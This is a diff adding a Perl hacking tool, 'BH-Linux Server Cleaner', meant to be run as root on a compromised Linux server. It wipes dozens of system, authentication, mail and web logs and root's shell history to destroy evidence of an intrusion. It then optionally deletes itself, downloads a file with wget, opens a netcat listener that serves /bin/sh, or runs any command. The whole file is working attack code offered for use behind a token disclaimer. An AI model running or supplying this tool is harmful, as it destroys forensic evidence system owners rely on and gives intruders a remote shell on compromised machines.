@@ -1,0 +1,126 @@
+#!/usr/bin/perl
+#=============================================================#
+# BH-Linux Server Cleaner BETA (BH-LSC)
+# Coded By: Br4v3-H34r7
+# Contact: R00T@Br4v3-H34r7.CoM
+# Website: Br4v3-H34r7.CoM | BH2H.CoM 
+# License: GNU General Public License v3
+# Greetz: All Arab And Muslim Hackers  | Not For Script kiddies
+#=============================================================#
+# BEGIN THE CODE
+{
+	print "\n\t+--------------------------+\n";
+	print "\t|       BH-LSC  BETA       |\n";
+	print "\t|   Coded By Br4v3-H34r7   |\n";
+	print "\t| Br4v3-H34r7.COM|BH2H.CoM |\n";
+	print "\t+--------------------------+\n";
+	print "\t|  NOT FOR ILLEGALE USAGE  |\n";
+	print "\t+--------------------------+\n\n";
+		
+	$uid = getpwuid($>); # Get User ID
+	if($uid eq "root") # If root
+	{	
+		print "[+] Do You Want To Clean The Server? (Y/N): ";
+		chomp($input = <STDIN>); # Get The Answer
+		$Linput = "\L$input"; # Make $Linput Lowercase Chars
+			if($Linput eq "y") # Yes Clean The Server
+			{
+				print "[+] Clean The Server After You Exit? (Y/N): ";
+				chomp($AfterExit = <STDIN>); # Get The Answer
+				$LAfterExit = "\L$AfterExit"; #  Make $AfterExit Lowercase Chars
+				if($LAfterExit eq "y") # Delete The Server Log After Exit
+				{
+					print "[+] After How Many Time? (in Seconds): ";
+					chomp($Seconds = <STDIN>); # Get The Seconds
+			
+					print "[+] Run Custom Command After You Exit? (Y/N): ";
+					chomp($RunAfter = <STDIN>); # Get The Answer
+					$LRunAfter = "\L$RunAfter"; # Make $RunAfter Lowercase Chars
+						if ($LRunAfter eq "y") # Yes Run Command After Exit The server
+						{
+							print "    (1) Remove This Tool\n";
+							print "    (2) Delete Custom File\n";
+							print "    (3) Download File To This Server\n";
+							print "    (4) Open Lestining Port Using Netcat\n";
+							print "    (5) Other Command\n";
+							
+							print "[+] What Do You Want To Do? (Enter The Number): ";
+							chomp($theanswer = <STDIN>); # Get The Answer
+								if($theanswer eq 1) # Delete This Tool
+								{
+									use Cwd qw(realpath);
+									my $path = realpath($0); # Get The Tool Name
+									$command = ("rm -r \"$path\""); # Set $command To Remove The Tool
+								}	
+								elsif($theanswer eq 2) # Delete Custom  File
+								{
+									print "[+] Enter Full File Path: ";
+									chomp($file = <STDIN>); # Get File Path
+									$command = "rm -r $file"; # Set $command To Delete Custom  File
+								}
+								elsif($theanswer eq 3) # Download File To This Server
+								{
+									print "[+] Enter The File URL: ";
+									chomp($wget = <STDIN>); # Get File Path
+									$command = "wget $wget"; # Set $command To Download File To This Server
+								}
+								elsif($theanswer eq 4) # Open Lestining Port Using Netcat
+								{
+									print "What Is The Port: ";
+									chomp($port = <STDIN>); # Get The Port Number
+									$command = "netcat -l -p $port -e /bin/sh"; # Set $command To Open Lestining Port Using Netcat
+								}
+								elsif($theanswer eq 5) # Other Command
+								{
+									print "[+] What Is The Command?: ";
+									chomp($command = <STDIN>); # Set $command As User Input
+								}
+								
+								else # Error Input
+								{
+									print "[-] Error: Wrong Type... Skiped!\n";
+								}
+								print "[+] You Have \"$Seconds\" Seconds To Exit The Server\n";
+								sleep $Seconds; # Sleep For Some Seconds
+						}	
+				}	
+				elsif($LAfterExit eq "n")
+				{
+					print "[-] Answer NO, Dont't Run Custome Command After You Exit...Skiped!\n";
+				}
+				else # Error Input
+				{
+					print "[-] Error: Wrong Type... Skiped!\n";
+				}
+					print "[+] Start Cleaning The Server...\n";
+					sleep 2; # Sleep For 2 Seconds
+					
+					@logs = ("/var/log", "/var/log/warn", "/var/log/lastlog", "/var/log/messages", "/var/log/wtmp", "/var/log/poplog", "/var/log/qmail", "/var/log/smtpd", "/var/log/telnetd", "/var/log/secure", "/var/log/auth", "/var/log/thttpd_log", "/var/log/spooler", "/var/spool/tmp", "/var/spool/errors", "/var/spool/locks", "/var/log/nctfpd.errs", "/var/log/acct", "/var/apache/log", "/var/apache/logs", "/usr/local/apache/log", "/usr/local/apache/logs", "/usr/local/www/logs/thttpd_log", "/var/log/news", "/var/log/news/news", "/var/log/news.all", "/var/log/news/news.all", "/var/log/news/news.crit", "/var/log/news/news.err", "/var/log/news/news.notice", "/var/log/news/suck.err", "/var/log/news/suck.notice", "/var/log/xferlog", "/var/log/proftpd/xferlog.legacy", "/var/log/proftpd.xferlog", "/var/log/proftpd.access_log", "/var/log/httpd/error_log", "/var/log/httpsd/ssl_log", "/var/log/httpsd/ssl.access_log", "/var/adm", "/var/run/utmp", "/etc/wtmp", "/etc/utmp", "/etc/mail/access", "/var/log/ncftpd/misclog.txt", );
+					unlink @logs; # Deleting The Logs
+					print "[+] Server Logs Deleted Sucesfully\n";
+					
+					@bash = ("/root/.ksh_history", "/root/.bash_history", "/root/.bash_logut", "/root/.Xauthority");
+					unlink @bash; # Deleting bash History
+					print "[+] bash History Deleted Sucesfully\n\n";
+					
+					system $command; # Run The Command
+			}
+			elsif($Linput eq "n") # Exit With Out Cleaning The Server
+			{
+				print "[-] Answer NO, Exit With Out Cleaning...Exit!\n";
+				exit(); # Exit The Program
+			}
+			else # Error Input
+			{
+				print "[-] Error: Wrong Type... Exit!\n";
+				exit(); # Exit The Program
+			}
+	}
+	else # If Not root
+	{
+		print "[-] Error: You Must Be Server \"root\" To Use This Tool... Exit!\n";
+		exit(); # Exit The Program
+	}
+} 
+# END THE CODE
+#=============================================================#
